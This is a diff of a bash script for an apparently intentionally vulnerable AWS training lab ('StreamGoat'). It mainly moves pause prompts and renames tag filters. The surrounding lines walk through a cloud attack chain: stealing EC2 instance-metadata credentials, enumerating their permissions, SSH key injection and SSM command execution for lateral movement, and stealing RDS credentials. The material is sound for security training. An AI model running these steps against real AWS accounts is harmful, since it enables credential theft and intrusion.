@@ -176,7 +176,6 @@ aws configure set aws_session_token     "$SESS"   --profile "$PROFILE"
 aws configure set region                us-east-1 --profile "$PROFILE"
 spin_stop
 printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -190,6 +189,7 @@ printf "  • ${MAGENTA}SecretAccessKey${RESET}: Used to sign API requests\n"
 printf "  • ${MAGENTA}SessionToken${RESET}: Required for temporary credentials\n\n"
 printf "These credentials inherit all permissions of the EC2 instance's IAM role.\n"
 printf "IMDSv2 requires a session token, but once obtained, credential theft is trivial.\n\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 2. Permission enumeration for stolen IMDS
@@ -215,7 +215,7 @@ try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "
 
 printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "Discovered EC2 Instances" "${RESET}"
 aws ec2 describe-instances  --profile "$PROFILE" \
-  --filters "Name=tag:Name,Values=StreamGoat-*" \
+  --filters "Name=tag:Name,Values=StreamGoat-aws1-*" \
             "Name=instance-state-name,Values=running" \
   --query 'Reservations[].Instances[].{Id:InstanceId,State:State.Name,PublicIP:PublicIpAddress,PrivateIP:PrivateIpAddress,Name: Tags[?Key==`Name`]|[0].Value}' \
   --output table
@@ -233,7 +233,6 @@ try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
 printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -246,6 +245,7 @@ printf "  • ${MAGENTA}SSM permissions${RESET}: Enables lateral movement withou
 printf "  • ${MAGENTA}EC2 Instance Connect${RESET}: Allows SSH key injection\n\n"
 printf "Each [OK] result represents an exploitable permission path.\n"
 printf "EC2b becomes our next target for lateral movement.\n\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 3. Access gathering to EC2b
@@ -253,7 +253,7 @@ printf "EC2b becomes our next target for lateral movement.\n\n"
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Access gathering to EC2b  ===" "${RESET}"
 printf "We are going to validate two more permissions which may give us direct access to EC2b\n"
 read IID AZ PUBIP <<<"$(aws ec2 describe-instances  --profile "$PROFILE" \
-  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-EC2b' \
+  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-aws1-EC2b' \
   --query 'Reservations[].Instances[][InstanceId,Placement.AvailabilityZone,PublicIpAddress]' \
   --output text | head -n1)"
 
@@ -328,7 +328,6 @@ ssm_probe() {
 
 ssm_probe "$IID"
 printf "\n"
-read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -340,6 +339,7 @@ printf "    This grants SSH access without knowing existing credentials.\n\n"
 printf "  • ${MAGENTA}SSM SendCommand${RESET}: Executes commands via AWS APIs\n"
 printf "    Works even if port 22 is blocked (no direct network needed).\n\n"
 printf "We now have shell access to EC2b using EC2a's compromised credentials.\n\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 4. Stealing credentials to access RDS
@@ -379,7 +379,6 @@ else
   exit 1
 fi
 printf "\n"
-read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -394,6 +393,7 @@ printf "Better alternatives for credential management in AWS:\n"
 printf "  • ${CYAN}Secrets Manager${RESET}: Centralized secret storage with IAM\n"
 printf "  • ${CYAN}RDS IAM Authentication${RESET}: No passwords required\n"
 printf "  • ${CYAN}Parameter Store${RESET}: SecureString parameters with KMS\n\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 5. Accessing sensitive data in RDS
